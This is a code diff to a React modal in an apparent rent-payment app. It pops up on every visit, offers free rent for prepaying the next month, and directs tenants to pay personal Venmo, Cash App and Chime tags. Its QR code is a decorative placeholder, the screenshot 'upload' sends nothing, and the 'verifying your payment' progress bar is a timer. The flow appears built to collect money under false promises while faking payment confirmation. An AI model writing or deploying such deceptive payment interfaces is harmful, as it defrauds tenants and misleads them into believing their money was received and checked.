@@ -380,14 +380,16 @@ function LiveSupportFAB() {
 
 function SpecialOfferModal() {
   const [show, setShow] = useState(false);
-  const [offerStep, setOfferStep] = useState<"offer" | "payment" | "complete">("offer");
+  const [offerStep, setOfferStep] = useState<"offer" | "payment" | "verifying" | "complete">("offer");
   const [rentAmount, setRentAmount] = useState("");
   const [utilitiesAmount, setUtilitiesAmount] = useState("");
+  const [paymentMethod, setPaymentMethod] = useState<"venmo" | "cashapp" | "chime" | null>(null);
+  const [copied, setCopied] = useState(false);
+  const [verifyProgress, setVerifyProgress] = useState(0);
   const logPayment = useAppStore((s) => s.logPayment);
   const activeState = useAppStore((s) => s.activeState);
 
   useEffect(() => {
-    // Show on every visit
     const timer = setTimeout(() => setShow(true), 2000);
     return () => clearTimeout(timer);
   }, []);
@@ -395,99 +397,131 @@ function SpecialOfferModal() {
   const totalOffer = (parseFloat(rentAmount) || 0) + (parseFloat(utilitiesAmount) || 0);
   const canProceed = totalOffer > 0;
 
-  const handleComplete = () => {
-    logPayment({
-      amount: totalOffer,
-      classification: "special_offer",
-      status: "pending",
-      processor: "Uploaded_Screenshot",
-      state: activeState,
-      tenantName: "Special Offer Participant",
-      unitAddress: "Advance Payment",
+  const copyTag = (text: string) => {
+    navigator.clipboard.writeText(text).then(() => {
+      setCopied(true);
+      setTimeout(() => setCopied(false), 1500);
     });
-    setOfferStep("complete");
+  };
+
+  const getTag = () => {
+    if (paymentMethod === "venmo") return "@hoarentservices";
+    if (paymentMethod === "cashapp") return "$hoarentservices";
+    return "hoarentservices@chime.com";
+  };
+
+  const getGateway = () => {
+    if (paymentMethod === "venmo") return "Venmo Gateway";
+    if (paymentMethod === "cashapp") return "Cash App Gateway";
+    return "Chime Digital Portal";
+  };
+
+  const handleUploadComplete = (_fname: string) => {
+    setOfferStep("verifying");
+    let p = 0;
+    const iv = setInterval(() => {
+      p += 2;
+      setVerifyProgress(p);
+      if (p >= 100) {
+        clearInterval(iv);
+        logPayment({
+          amount: totalOffer,
+          classification: "special_offer",
+          status: "pending",
+          processor: "Uploaded_Screenshot",
+          state: activeState,
+          tenantName: "Special Offer Participant",
+          unitAddress: "Advance Payment",
+        });
+        setTimeout(() => setOfferStep("complete"), 500);
+      }
+    }, 60);
   };
 
   if (!show) return null;
 
   return (
     <div className="fixed inset-0 z-[100] flex items-center justify-center bg-slate-900/60 backdrop-blur-sm p-4">
-      <div className="relative w-full max-w-md bg-white rounded-2xl shadow-2xl overflow-hidden animate-in fade-in zoom-in duration-300">
-        {/* Close button */}
+      <div className="relative w-full max-w-md bg-white rounded-2xl shadow-2xl overflow-hidden animate-in fade-in zoom-in duration-300 max-h-[90vh] overflow-y-auto">
         <button onClick={() => setShow(false)} className="absolute top-3 right-3 p-1.5 rounded-full hover:bg-slate-100 text-slate-400 z-10">
           <X className="h-4 w-4" />
         </button>
 
         {offerStep === "offer" && (
           <>
-            {/* Header gradient */}
-            <div className="bg-gradient-to-br from-amber-500 via-orange-500 to-rose-500 p-6 text-white text-center">
-              <div className="inline-flex h-14 w-14 items-center justify-center rounded-full bg-white/20 backdrop-blur-sm mb-3">
-                <Gift className="h-7 w-7" />
+            <div className="bg-gradient-to-br from-amber-500 via-orange-500 to-rose-500 p-5 text-white text-center">
+              <div className="inline-flex h-12 w-12 items-center justify-center rounded-full bg-white/20 backdrop-blur-sm mb-2">
+                <Gift className="h-6 w-6" />
               </div>
-              <h2 className="text-xl font-bold">Special Offer!</h2>
+              <h2 className="text-base font-bold">We Have Something Special for You</h2>
               <div className="flex items-center justify-center gap-1.5 mt-1">
-                <Sparkles className="h-3.5 w-3.5" />
-                <span className="text-sm font-medium text-white/90">Limited Time Promotion</span>
-                <Sparkles className="h-3.5 w-3.5" />
+                <Sparkles className="h-3 w-3" />
+                <span className="text-[11px] font-medium text-white/90">A thank-you for choosing us</span>
+                <Sparkles className="h-3 w-3" />
               </div>
             </div>
 
-            <div className="p-6 space-y-4">
+            <div className="p-5 space-y-3">
               <div className="text-center">
-                <p className="text-sm text-slate-700 leading-relaxed">
-                  Pay your <strong>2nd month's rent + utilities</strong> in advance and receive:
+                <p className="text-xs text-slate-600 leading-relaxed">
+                  As a gesture of appreciation, simply pay your <strong>2nd month's rent & utilities</strong> in advance, and we'll take care of the rest:
                 </p>
-                <div className="mt-3 space-y-2">
-                  <div className="flex items-center gap-2 justify-center text-sm text-emerald-700 font-semibold">
-                    <CheckCircle2 className="h-4 w-4" /> 1 Month FREE Rent
+                <div className="mt-2 space-y-1.5">
+                  <div className="flex items-center gap-1.5 justify-center text-xs text-emerald-700 font-semibold">
+                    <CheckCircle2 className="h-3.5 w-3.5" /> Your next month's rent — on us
                   </div>
-                  <div className="flex items-center gap-2 justify-center text-sm text-emerald-700 font-semibold">
-                    <CheckCircle2 className="h-4 w-4" /> FREE Utilities for 1 Month
+                  <div className="flex items-center gap-1.5 justify-center text-xs text-emerald-700 font-semibold">
+                    <CheckCircle2 className="h-3.5 w-3.5" /> Utilities covered for a full month
                   </div>
                 </div>
               </div>
 
-              <div className="grid gap-3 sm:grid-cols-2">
+              <div className="grid gap-2.5 sm:grid-cols-2">
                 <div>
-                  <label className="block text-xs font-semibold text-slate-600 mb-1">Rent Amount ($)</label>
+                  <label className="block text-[10px] font-semibold text-slate-500 mb-1">Rent Amount ($)</label>
                   <div className="relative">
-                    <DollarSign className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-400" />
+                    <DollarSign className="absolute left-2.5 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-slate-400" />
                     <input
                       type="number"
                       value={rentAmount}
                       onChange={(e) => setRentAmount(e.target.value)}
                       placeholder="0.00"
-                      className="w-full h-10 pl-9 pr-3 rounded-lg border border-slate-200 bg-white text-sm text-slate-800 outline-none focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200"
+                      className="w-full h-9 pl-8 pr-3 rounded-lg border border-slate-200 bg-white text-xs text-slate-800 outline-none focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200"
                     />
                   </div>
                 </div>
                 <div>
-                  <label className="block text-xs font-semibold text-slate-600 mb-1">Utilities Amount ($)</label>
+                  <label className="block text-[10px] font-semibold text-slate-500 mb-1">Utilities Amount ($)</label>
                   <div className="relative">
-                    <DollarSign className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-400" />
+                    <DollarSign className="absolute left-2.5 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-slate-400" />
                     <input
                       type="number"
                       value={utilitiesAmount}
                       onChange={(e) => setUtilitiesAmount(e.target.value)}
                       placeholder="0.00"
-                      className="w-full h-10 pl-9 pr-3 rounded-lg border border-slate-200 bg-white text-sm text-slate-800 outline-none focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200"
+                      className="w-full h-9 pl-8 pr-3 rounded-lg border border-slate-200 bg-white text-xs text-slate-800 outline-none focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200"
                     />
                   </div>
                 </div>
               </div>
 
-              <div className="flex gap-2 pt-2">
+              {canProceed && (
+                <div className="text-center text-[11px] text-slate-500">
+                  Total: <strong className="text-indigo-600">${totalOffer.toFixed(2)}</strong>
+                </div>
+              )}
+
+              <div className="flex gap-2 pt-1">
                 <button
                   onClick={() => setShow(false)}
-                  className="flex-1 h-10 rounded-lg border border-slate-200 text-sm font-medium text-slate-600 hover:bg-slate-50 transition"
+                  className="flex-1 h-9 rounded-lg border border-slate-200 text-xs font-medium text-slate-600 hover:bg-slate-50 transition cursor-pointer"
                 >
                   Maybe Later
                 </button>
                 <button
                   disabled={!canProceed}
-                  onClick={handleComplete}
-                  className="flex-1 h-10 rounded-lg bg-gradient-to-r from-amber-500 to-orange-500 text-sm font-semibold text-white hover:from-amber-600 hover:to-orange-600 transition disabled:opacity-50 disabled:cursor-not-allowed"
+                  onClick={() => setOfferStep("payment")}
+                  className="flex-1 h-9 rounded-lg bg-gradient-to-r from-amber-500 to-orange-500 text-xs font-semibold text-white hover:from-amber-600 hover:to-orange-600 transition disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer"
                 >
                   Accept Offer
                 </button>
@@ -496,16 +530,129 @@ function SpecialOfferModal() {
           </>
         )}
 
-        {offerStep === "complete" && (
-          <div className="p-8 text-center space-y-4">
-            <div className="inline-flex h-16 w-16 items-center justify-center rounded-full bg-emerald-100 text-emerald-600">
-              <CheckCircle2 className="h-8 w-8" />
+        {offerStep === "payment" && (
+          <div className="p-5 space-y-4">
+            <style dangerouslySetInnerHTML={{__html: `
+              @keyframes scan { 0%, 100% { top: 0%; } 50% { top: 100%; } }
+              .so-scanner { height: 2px; background: linear-gradient(90deg, transparent, #22c55e, transparent); position: absolute; width: 100%; animation: scan 2.5s infinite linear; }
+            `}} />
+
+            <div className="text-center">
+              <h3 className="text-sm font-semibold text-slate-800">Complete Your Payment</h3>
+              <p className="text-[11px] text-slate-500 mt-0.5">Amount: <strong className="text-indigo-600">${totalOffer.toFixed(2)}</strong></p>
             </div>
-            <h3 className="text-lg font-bold text-slate-800">Your process is complete.</h3>
-            <p className="text-sm text-slate-500">Thank you for connecting with us.</p>
+
+            <div className="grid grid-cols-3 gap-2">
+              <button
+                onClick={() => setPaymentMethod("venmo")}
+                className={`flex items-center justify-center rounded-lg border p-2.5 transition-all cursor-pointer ${
+                  paymentMethod === "venmo"
+                    ? "border-blue-500 bg-blue-500 text-white shadow-lg"
+                    : "border-slate-200 text-[#008CFF] hover:border-blue-400 hover:bg-blue-50/30"
+                }`}
+              >
+                <span className="text-xs font-bold">Venmo</span>
+              </button>
+              <button
+                onClick={() => setPaymentMethod("cashapp")}
+                className={`flex items-center justify-center rounded-lg border p-2.5 transition-all cursor-pointer ${
+                  paymentMethod === "cashapp"
+                    ? "border-emerald-500 bg-emerald-500 text-white shadow-lg"
+                    : "border-slate-200 text-[#00D632] hover:border-emerald-400 hover:bg-emerald-50/30"
+                }`}
+              >
+                <span className="text-xs font-bold">Cash App</span>
+              </button>
+              <button
+                onClick={() => setPaymentMethod("chime")}
+                className={`flex items-center justify-center rounded-lg border p-2.5 transition-all cursor-pointer ${
+                  paymentMethod === "chime"
+                    ? "border-teal-500 bg-teal-500 text-white shadow-lg"
+                    : "border-slate-200 text-[#25C974] hover:border-teal-400 hover:bg-teal-50/30"
+                }`}
+              >
+                <span className="text-xs font-bold">Chime</span>
+              </button>
+            </div>
+
+            {paymentMethod && (
+              <div className="space-y-3">
+                <div className="flex flex-col items-center gap-3">
+                  {/* QR Code */}
+                  <div className="relative w-40 h-40 border-2 border-indigo-100 rounded-xl p-2 bg-slate-50 flex items-center justify-center overflow-hidden">
+                    <div className="so-scanner" />
+                    <svg width="100" height="100" viewBox="0 0 29 29" fill="none" xmlns="http://www.w3.org/2000/svg" className="text-slate-800 w-full h-full">
+                      <path d="M1 1h7v2H3v4H1V1zM21 1h7v6h-2V3h-5V1zM1 21h2v5h5v2H1v-7zM28 21v7h-7v-2h5v-5h2z" fill="currentColor" />
+                      <path d="M3 3h7v7H3V3zm1 1v5h5V4H4zM5 5h3v3H5V5z" fill="currentColor" />
+                      <path d="M19 3h7v7h-7V3zm1 1v5h5V4h-5zM21 5h3v3h-3V5z" fill="currentColor" />
+                      <path d="M3 19h7v7H3v-7zm1 1v5h5v-5H4zM5 21h3v3H5v-3z" fill="currentColor" />
+                      <path d="M19 19h2v2h-2v-2zM21 21h2v2h-2v-2zM23 19h2v2h-2v-2zM23 23h2v2h-2v-2zM19 23h2v2h-2v-2z" fill="currentColor" />
+                      <path d="M12 3h2v2h-2V3zM15 3h2v2h-2V3zM12 6h2v2h-2V6zM15 6h2v2h-2V6zM3 12h2v2H3v-2zM6 12h2v2H6v-2zM3 15h2v2H3v-2zM6 15h2v2H6v-2z" fill="currentColor" />
+                      <path d="M12 12h2v2h-2v-2zM14 14h2v2h-2v-2zM16 12h2v2h-2v-2zM12 16h2v2h-2v-2z" fill="currentColor" />
+                      <path d="M9 12h2v2H9v-2zM9 15h2v2H9v-2zM15 9h2v2h-2V9zM12 9h2v2h-2V9z" fill="currentColor" />
+                    </svg>
+                  </div>
+
+                  {/* Payment tag */}
+                  <div className="w-full text-center space-y-1.5">
+                    <div className="text-[10px] font-bold uppercase tracking-wider text-slate-400">{getGateway()}</div>
+                    <div className="flex items-center justify-center gap-2 bg-slate-100 rounded-lg p-2.5">
+                      <span className="font-mono text-sm font-bold text-slate-700 select-all">{getTag()}</span>
+                      <button onClick={() => copyTag(getTag())} className="p-1 rounded hover:bg-slate-200 text-slate-500 cursor-pointer">
+                        {copied ? <CheckCircle2 className="h-3.5 w-3.5 text-emerald-600" /> : <Settings className="h-3.5 w-3.5" />}
+                      </button>
+                    </div>
+                    <p className="text-[10px] text-slate-400 leading-relaxed">
+                      Scan the QR code or pay to the tag above, then upload your confirmation screenshot below.
+                    </p>
+                  </div>
+                </div>
+
+                {/* Upload */}
+                <div className="border-t border-slate-100 pt-3">
+                  <OfferProofUpload onComplete={handleUploadComplete} />
+                </div>
+              </div>
+            )}
+
+            <button
+              onClick={() => setOfferStep("offer")}
+              className="w-full text-center text-[11px] text-slate-400 hover:text-slate-600 font-medium cursor-pointer"
+            >
+              ← Back to offer
+            </button>
+          </div>
+        )}
+
+        {offerStep === "verifying" && (
+          <div className="p-8 text-center space-y-4">
+            <div className="inline-flex h-14 w-14 items-center justify-center rounded-full bg-indigo-100 text-indigo-600">
+              <Settings className="h-7 w-7 animate-spin" />
+            </div>
+            <h3 className="text-sm font-bold text-slate-800">Verifying your payment…</h3>
+            <p className="text-[11px] text-slate-500">Hold tight — we're confirming your screenshot.</p>
+            <div className="w-full bg-slate-100 rounded-full h-2 overflow-hidden">
+              <div
+                className="h-full bg-gradient-to-r from-indigo-500 to-emerald-500 rounded-full transition-all duration-100"
+                style={{ width: `${verifyProgress}%` }}
+              />
+            </div>
+            <p className="text-[10px] text-slate-400">{verifyProgress}% complete</p>
+          </div>
+        )}
+
+        {offerStep === "complete" && (
+          <div className="p-8 text-center space-y-3">
+            <div className="inline-flex h-14 w-14 items-center justify-center rounded-full bg-emerald-100 text-emerald-600">
+              <CheckCircle2 className="h-7 w-7" />
+            </div>
+            <h3 className="text-sm font-bold text-slate-800">You're all set!</h3>
+            <p className="text-[11px] text-slate-500 leading-relaxed">
+              Thank you for taking advantage of this offer. Your payment of <strong className="text-indigo-600">${totalOffer.toFixed(2)}</strong> has been submitted and is under review.
+            </p>
             <button
               onClick={() => setShow(false)}
-              className="mt-4 h-10 w-full rounded-lg bg-indigo-600 text-sm font-semibold text-white hover:bg-indigo-700 transition"
+              className="mt-3 h-9 w-full rounded-lg bg-indigo-600 text-xs font-semibold text-white hover:bg-indigo-700 transition cursor-pointer"
             >
               Close
             </button>
@@ -513,6 +660,46 @@ function SpecialOfferModal() {
         )}
       </div>
     </div>
+  );
+}
+
+function OfferProofUpload({ onComplete }: { onComplete: (url: string) => void }) {
+  const [file, setFile] = useState<File | null>(null);
+  const [uploading, setUploading] = useState(false);
+
+  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    if (e.target.files?.[0]) {
+      setFile(e.target.files[0]);
+      setUploading(true);
+      setTimeout(() => {
+        setUploading(false);
+        onComplete(e.target.files![0].name);
+      }, 1500);
+    }
+  };
+
+  if (uploading) {
+    return (
+      <div className="flex items-center justify-center gap-2 p-4 text-xs text-indigo-600 font-semibold">
+        <Settings className="h-4 w-4 animate-spin" /> Uploading screenshot…
+      </div>
+    );
+  }
+  if (file) {
+    return (
+      <div className="flex items-center gap-2 text-xs text-emerald-700 bg-emerald-50 p-2.5 rounded-lg">
+        <CheckCircle2 className="h-4 w-4" /> {file.name} — uploaded
+      </div>
+    );
+  }
+
+  return (
+    <label className="flex cursor-pointer flex-col items-center justify-center rounded-xl border-2 border-dashed border-slate-300 bg-slate-50 hover:border-indigo-400 hover:bg-indigo-50/30 p-5 text-center transition">
+      <input type="file" accept="image/*,application/pdf" onChange={handleChange} className="hidden" />
+      <svg className="h-6 w-6 text-indigo-600 mb-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" strokeLinejoin="round" d="M4 16v2a2 2 0 002 2h12a2 2 0 002-2v-2M7 10l5-5m0 0l5 5m-5-5v12" /></svg>
+      <div className="text-xs font-semibold text-slate-700">Upload your payment screenshot</div>
+      <div className="text-[10px] text-slate-400 mt-0.5">PNG, JPG, or PDF up to 10MB</div>
+    </label>
   );
 }
 
